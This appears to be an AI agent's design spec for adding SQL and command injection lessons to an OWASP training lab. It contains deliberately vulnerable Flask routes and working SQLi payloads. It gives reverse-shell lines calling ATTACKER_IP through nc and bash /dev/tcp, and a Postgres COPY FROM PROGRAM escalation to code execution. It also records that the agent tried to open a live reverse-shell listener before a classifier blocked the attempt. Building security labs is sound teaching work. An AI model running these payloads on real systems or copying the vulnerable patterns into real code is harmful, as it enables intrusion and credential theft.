# OWASP Top 10 Training Lab — A03 SQL/Command Injection Content Expansion Design Spec

Date: 2026-09-22
Status: Approved

Content-expansion and new-example sub-project within the EXISTING A03
(Injection) category — not a new category. Follows the same
brainstorm→spec→plan→implement cycle used for every prior sub-project this
session, scaled to this sub-project's actual size (2 content expansions,
1 content expansion of an existing example, 2 brand-new examples within
A03's existing "SQL Injection" group).

## Purpose

Deepen A03's SQL and OS command injection teaching content per explicit
user request:
- Expand Blind Time-Based SQLi's exploitation text with DB version, table,
  username, and password extraction techniques.
- Expand UNION-Based SQLi's exploitation text with a second payload
  pulling real account credentials, not just the existing secrets table.
- Expand OS Command Injection's exploitation text with reverse-shell
  delivery instructions (nc/ncat and a bash fallback).
- Add a new Error-Based SQL Injection example.
- Add a new Advanced SQL Injection → Remote Code Execution example,
  walking the full chain from detection through a real Postgres-specific
  RCE escalation technique.

## Decisions from brainstorming

- **Every live-Postgres-specific technique in this spec was empirically
  verified against this app's actual, running docker-compose stack before
  being written down** — not assumed from general SQLi folklore. This
  mirrors, and goes further than, the discipline already established for
  A06/A08/A10's own live-verification steps. Specifically verified via
  `docker exec` into the running `owasp-lab-app-1` and
  `owasp-lab-postgres-1` containers, using this app's exact
  `db.session.execute(text(query))` code path:
  - Stacked (semicolon-separated multi-statement) SQL genuinely executes
    through this app's query pattern via psycopg3 — confirmed by creating
    and populating a scratch table via a single `execute()` call.
  - The app's configured Postgres role (`lab`) is a **superuser**
    (`rolsuper = true`), so `COPY ... FROM PROGRAM` is usable with no
    privilege restriction — itself a notable, teachable fact (a properly
    least-privileged DB role would block this escalation entirely).
  - `COPY <table> FROM PROGRAM '<command>'` genuinely executes OS commands
    on the Postgres container and the output is readable back through a
    normal `SELECT` — verified end-to-end with a single, realistic
    form-field payload replicating this app's exact vulnerable
    query-building pattern (quote breakout → stacked `DROP`/`CREATE`/
    `COPY` → readback), confirmed output `uid=70(postgres)
    gid=70(postgres) groups=70(postgres)` for an `id` command.
  - The `postgres:16-alpine` image this app actually uses has both `bash`
    and BusyBox `nc` (with `-e PROG` "run PROG after connect" support)
    available inside it — confirming a real reverse shell via
    `COPY ... FROM PROGRAM 'nc -e /bin/sh <host> <port>'` is achievable
    using tools the real container already ships with, no extra install
    needed.
  - The error-based SQLi technique (`CAST((SELECT ...) AS int)` type
    mismatch) genuinely leaks data in the raw exception message — verified
    live, extracting the seeded admin account's real plaintext password
    (`sup3r-s3cret-admin-pw`) directly from a Postgres
    `InvalidTextRepresentation` error.
  - The character-by-character blind-extraction idiom
    (`pg_sleep((SELECT CASE WHEN <condition> THEN 3 ELSE 0 END))`) was
    verified with both a true and a false condition against the real
    admin password's first character, confirming a genuine 3.02s vs. 0.00s
    timing split.
- **A permission boundary was hit and respected, not worked around**: an
  attempt to *actually open* a live reverse-shell listener and trigger a
  real network connection during this verification (even fully contained
  within local Docker containers) was blocked by the platform's own
  safety classifier ("Expose Local Services"). This was not bypassed. The
  consequence, adopted as a hard design rule for this whole sub-project:
  **no automated component — pytest, any implementer, any reviewer — ever
  opens a live reverse-shell listener or triggers a real outbound
  network-shell connection.** Every automated proof of command execution
  in this spec uses a safe, DB-readback mechanism (reading the injected
  command's output back through a normal `SELECT`, exactly as already
  live-verified above) — never a live socket. The reverse-shell step
  itself (in both the command-injection expansion and the new SQLi→RCE
  example) is real, working, **manually-run** exploitation content for a
  human learner in their own terminal against their own deployment, and
  is never something this sub-project's own tests attempt to execute
  live.
- **This app's own SQLite-vs-Postgres testability gap already has
  established precedent**, discovered fresh (not assumed) by reading the
  existing Blind Time-Based SQLi example's own test file: its own comment
  states the real `pg_sleep()` exploitation is "verified live against
  Postgres in the plan's final Docker-verification task, not here (SQLite
  has no `pg_sleep`)" — pytest there only proves a portable boolean-based
  injection works. **This exact same pattern is followed for every
  Postgres-specific technique added or expanded in this spec**: pytest
  verifies whatever is genuinely portable to SQLite (which this app's
  `TestConfig` uses); anything requiring real Postgres semantics (stacked
  queries, `pg_sleep`, `COPY FROM PROGRAM`, the `CAST` error-message leak)
  is documented as manually/already live-verified, matching precedent —
  not silently assumed to work, and not falsely claimed as
  automated-test-covered.
- **UNION-based credential exfiltration is the one addition that IS fully
  portable and testable**: SQLite supports `||` string concatenation and
  `UNION SELECT` identically to Postgres, so the new
  `' UNION SELECT id, username || ':' || password FROM injection_accounts
  --` payload gets a genuine new automated test, unlike the other
  Postgres-only additions.
- **No new database model or persisted proof table is introduced.** The
  new Advanced SQLi→RCE example's proof mechanism is the vulnerability's
  own natural readback channel (the attacker's own injected `COPY FROM
  PROGRAM` creates its own scratch table via the same injection point) —
  there is nothing analogous to A08's `RceProof` to add here, since the
  attacker's SQL access already provides read/write capability over
  whatever table it creates.
- **The two new examples reuse the existing `a03_secrets` table** (already
  seeded with an internal API key and a backup-location secret) as their
  queryable target, rather than introducing a new model — YAGNI; this
  table already exists specifically to be the "thing a leaky query
  shouldn't expose."
- **Existing routes' unhandled-exception behavior is untouched and stays
  distinct from the new Error-Based SQLi example.** Confirmed fresh: none
  of A03's existing SQLi routes (`login`, `search`, `check_username`)
  catch exceptions at all — a syntax-breaking input just produces Flask's
  generic 500 (the app runs with `DEBUG` unset/`False` everywhere, so no
  raw traceback leaks there today). The new Error-Based SQLi example
  introduces a **different, additional** vulnerable pattern — a route that
  explicitly catches the DB exception and displays it as "helpful"
  diagnostic text — a distinct, common, real-world anti-pattern in its own
  right, not a duplicate of the existing routes' generic-500 behavior.

## Components

### Expansion 1: Blind Time-Based SQL Injection (existing `check-username` example, `id: blind-sqli`)

No route/code changes. `check_username.html`'s `exploitation` block gains a
progressive extraction walkthrough, in this order, each using the same
`pg_sleep`-conditional idiom already established by the example's existing
payload:

```
DB version:
nobody' OR (SELECT 1 FROM pg_sleep((SELECT CASE WHEN (SELECT version()) LIKE 'PostgreSQL 1%' THEN 5 ELSE 0 END)))=1--

Confirm a table exists:
nobody' OR (SELECT 1 FROM pg_sleep((SELECT CASE WHEN (SELECT COUNT(*) FROM information_schema.tables WHERE table_name='injection_accounts')=1 THEN 5 ELSE 0 END)))=1--

Extract a username, one character at a time:
nobody' OR (SELECT 1 FROM pg_sleep((SELECT CASE WHEN (SELECT substring(username,1,1) FROM injection_accounts WHERE is_admin=true)='a' THEN 3 ELSE 0 END)))=1--

Extract a password, one character at a time:
nobody' OR (SELECT 1 FROM pg_sleep((SELECT CASE WHEN (SELECT substring(password,1,1) FROM injection_accounts WHERE username='admin')='s' THEN 3 ELSE 0 END)))=1--
```

Teaching text explains this is exactly how automated tools like `sqlmap`
walk a blind injection point to a full schema dump: confirm the engine,
enumerate `information_schema` for table/column names, then extract every
row one character and one boolean answer at a time.

### Expansion 2: UNION-Based SQL Injection (existing `search` example, `id: union-exfiltration`)

`search.html`'s `exploitation` block gains a second payload, presented as
the natural next step after pulling from `a03_secrets`:

```sql
' UNION SELECT id, username || ':' || password FROM injection_accounts --
```

Teaching text frames this as: once you've proven UNION works against one
table, the same technique reaches any table the database user can read —
including full account credentials, not just files/secrets that happen to
be lying around.

### Expansion 3: OS Command Injection (existing `host-lookup` example, `id: command-injection`)

No route/code changes. `host_lookup.html`'s `exploitation` block gains a
reverse-shell delivery step, appended after the existing `whoami`/`$(id)`
steps:

```
1. Start a listener on your own machine: nc -lvnp 4444
2. Submit this as the hostname (note the trailing `&` -- it backgrounds
   the reverse shell so the request itself returns immediately instead of
   hanging on this route's 10-second timeout):
   localhost; nc -e /bin/sh ATTACKER_IP 4444 &
3. If the target doesn't have `nc -e` compiled in, bash's own /dev/tcp
   feature works identically with no extra tools:
   localhost; bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' &
```

Teaching text explains why command execution escalates directly to a full
interactive shell: unlike the earlier `whoami`/`id` proofs (which only
show you *ran* a command), a reverse shell gives an attacker a persistent,
interactive foothold to explore the compromised host at will.

### New Example: Error-Based SQL Injection (Medium) — `id: error-based-sqli`

`GET/POST /a03/product-lookup`, new route, new template. A "look up a
product by ID" feature that queries `a03_secrets` by numeric ID and, on a
database error, displays the raw exception text as "helpful" diagnostic
output — a distinct, common real-world misconfiguration (unlike A03's
other SQLi routes, which just 500 on a broken query):

```python
@a03_bp.route("/product-lookup", methods=["GET", "POST"])
def product_lookup():
    product_id = ""
    result = None
    error = None
    if request.method == "POST":
        product_id = request.form.get("product_id", "")
        try:
            query = f"SELECT * FROM a03_secrets WHERE id = {product_id}"
            result = db.session.execute(text(query)).mappings().first()
        except Exception as e:
            # VULNERABLE: the raw database error is shown directly to the
            # user as "helpful" debugging output -- turning a type-mismatch
            # error into a data-exfiltration channel.
            db.session.rollback()
            error = str(e)
    return render_template(
        "a03_injection/product_lookup.html",
        product_id=product_id, result=result, error=error,
    )
```

Exploitation payload (live-verified above, genuinely leaks the seeded
admin password):

```
1 AND CAST((SELECT password FROM injection_accounts WHERE username='admin') AS int) > 0
```

Renders the real Postgres error text directly:
`invalid input syntax for type integer: "sup3r-s3cret-admin-pw"`.

Teaching text notes this specific error format is Postgres-specific
(verified live, not assumed) and won't reproduce identically against the
lab's SQLite-backed automated tests, matching the same convention already
established for `blind-sqli`.

### New Example: Advanced SQL Injection → Remote Code Execution (Hard) — `id: sqli-to-rce`

`GET/POST /a03/inventory-lookup`, new route, new template. A "check
inventory count by ID" feature, structured as the capstone walkthrough:
detect → confirm stacked queries → escalate to command execution via
Postgres's `COPY ... FROM PROGRAM`:

```python
@a03_bp.route("/inventory-lookup", methods=["GET", "POST"])
def inventory_lookup():
    sku = ""
    count = None
    error = None
    if request.method == "POST":
        sku = request.form.get("sku", "")
        try:
            # VULNERABLE: raw string-concatenated SQL passed to a driver
            # that permits multiple, semicolon-separated statements in one
            # call -- there is no query-count restriction, so an attacker
            # who can inject one statement can inject an unlimited chain
            # of them.
            query = f"SELECT COUNT(*) FROM a03_secrets WHERE id = {sku}"
            count = db.session.execute(text(query)).scalar()
            db.session.commit()
        except Exception as e:
            db.session.rollback()
            error = str(e)
    return render_template(
        "a03_injection/inventory_lookup.html", sku=sku, count=count, error=error,
    )
```

Exploitation walkthrough (each step live-verified above against the real
app):

```
1. Detect the injection point:
   1 OR 1=1

2. Confirm stacked queries are accepted (harmless no-op):
   1; SELECT 1--

3. Escalate to command execution -- the safe way to PROVE it (read the
   command's output back through the database itself, no network
   connection involved):
   1; DROP TABLE IF EXISTS a03_rce_check; CREATE TABLE a03_rce_check (output text); COPY a03_rce_check FROM PROGRAM 'id'; --
   Then look up the inventory for any SKU again, or query a03_rce_check
   directly -- it now contains this server's real `id` output.

4. Escalate further to a real reverse shell (manual step -- run this in
   your own terminal against your own deployment; this app's automated
   tests never do this):
   1; COPY (SELECT 1) TO PROGRAM 'nc -e /bin/sh ATTACKER_IP 4444'; --
```

Teaching text explains why this specific database is escalatable this way:
the connecting role (`lab`) is a Postgres superuser, so `COPY ... FROM/TO
PROGRAM` runs with no restriction — the exact kind of over-privileged
database account that turns "just a SQL injection" into full server
compromise. A properly least-privileged, non-superuser role would block
this specific escalation path entirely (noted in the `secure_code` block
alongside the standard parameterized-query fix).

## Data Model

No new SQLAlchemy models. Both new examples query the existing
`a03_secrets` table (`app/categories/a03_injection/models.py`'s `Secret`
model, already seeded with an API key and a backup-location value) as
their target — YAGNI, and pedagogically apt (it already exists
specifically to be "the thing a leaky query shouldn't expose").

## Navigation

Both new `ExampleNav` entries join A03's existing "SQL Injection" group
(the group all five current SQLi examples already belong to), inserted
directly adjacent to their siblings in the `examples=[...]` list so the
group stays Easy→Hard sorted and the source file keeps all SQL Injection
examples contiguous, exactly matching the existing five's own layout:

```python
# ... sqli-login (Easy), union-exfiltration (Medium), roster-sort (Medium) ...
ExampleNav(
    id="error-based-sqli",
    title="Error-Based SQL Injection via Product Lookup",
    group="SQL Injection",
    difficulty="Medium",
    endpoint="a03_injection.product_lookup",
),
# ... blind-sqli (Hard), roster-lookup (Hard) ...
ExampleNav(
    id="sqli-to-rce",
    title="Advanced SQL Injection: From Detection to Remote Code Execution",
    group="SQL Injection",
    difficulty="Hard",
    endpoint="a03_injection.inventory_lookup",
),
# ... reflected-xss and the rest of A03's other groups, unchanged ...
```

Resulting "SQL Injection" group order:
`sqli-login (Easy) → union-exfiltration (Medium) → roster-sort (Medium) →
error-based-sqli (Medium) → blind-sqli (Hard) → roster-lookup (Hard) →
sqli-to-rce (Hard)` — Easy→Hard sorted throughout.

`tests/test_a03_overview.py`'s `test_a03_registered_in_nav` (flat
difficulty list) and `test_a03_examples_grouped_by_vulnerability_subtype`
(the "SQL Injection" group's id list) both need updating to include the
two new entries at the correct positions — every other group's assertions
in that file are unaffected.

## Testing

- **Expansion 1 (blind-sqli)**: no new tests — the existing portable
  boolean-injection test already covers everything pytest's SQLite backend
  can verify; the new `pg_sleep`-based extraction payloads shown in the
  teaching text are Postgres-specific and were live-verified during this
  spec's own writing (see Decisions), not re-tested by the automated
  suite, matching this example's own established precedent.
- **Expansion 2 (union-exfiltration)**: one new test, fully portable —
  submit the new `injection_accounts`-pulling UNION payload via the real
  Flask test client (against SQLite) and assert the response contains the
  real seeded admin username and password concatenated together
  (`admin:sup3r-s3cret-admin-pw`), proving the payload genuinely works
  end-to-end, not just that the SQL text is syntactically plausible.
- **Expansion 3 (command-injection)**: no new tests — the existing
  `INJECTION_PROOF_12345`-style test already proves arbitrary commands
  reach a real shell, which is the load-bearing fact the reverse-shell
  technique builds on; per this spec's hard rule above, no automated test
  opens a live socket to catch a reverse shell.
- **New: error-based-sqli**: route-level tests via the real Flask test
  client — legitimate numeric lookup works; submitting a single quote or a
  deliberately malformed value produces a genuine database error and the
  raw error text is surfaced in the response (proving the "helpful debug
  output" vulnerability is real); the specific Postgres `CAST`
  data-leaking payload is documented as live-verified (see Decisions), not
  re-tested against SQLite (SQLite's own type-affinity rules don't raise
  the same class of error `CAST(text AS int)` does in Postgres).
- **New: sqli-to-rce**: route-level tests via the real Flask test client
  — legitimate numeric lookup works; a portable boolean-injection payload
  (`1 OR 1=1`) proves the field is genuinely injectable (returning a
  different count than a literal, nonexistent SKU would); the stacked-
  query and `COPY FROM PROGRAM` escalation steps are documented as
  live-verified against the real running app during this spec's own
  writing (see Decisions) — not re-tested by pytest, since SQLite supports
  neither multi-statement `execute()` calls nor `COPY` syntax at all.
- `tests/test_a03_overview.py` updated: `test_a03_registered_in_nav`'s
  flat difficulty list and `test_a03_examples_grouped_by_vulnerability_
  subtype`'s "SQL Injection" group id list both get the two new entries
  inserted at their correct positions.
- README.md's A03 example list (in both the intro paragraph and the
  category summary table) gets updated to mention the two new examples
  and the expanded content, matching every other category's format.

## Out of scope for this spec

- Any change to A03's other groups (XSS, XXE, SSTI, LDAP Injection) or any
  other existing category.
- Any automated test that opens a live network listener to catch a
  reverse shell, or any implementer/reviewer action that does the same —
  a hard rule established above after hitting a real permission boundary
  during this spec's own live-verification work.
- Any new database model, persisted proof table, or scoring/hints
  infrastructure — those are separate, already-deferred sub-projects.
- Restructuring `app/categories/a03_injection/routes.py` into multiple
  files — it's already the largest single-file routes module in this app
  (450 lines before this spec), but splitting it is an unrelated refactor
  this session's own established convention (one routes.py per category,
  used unmodified by every category so far) doesn't call for; not
  proposed here.
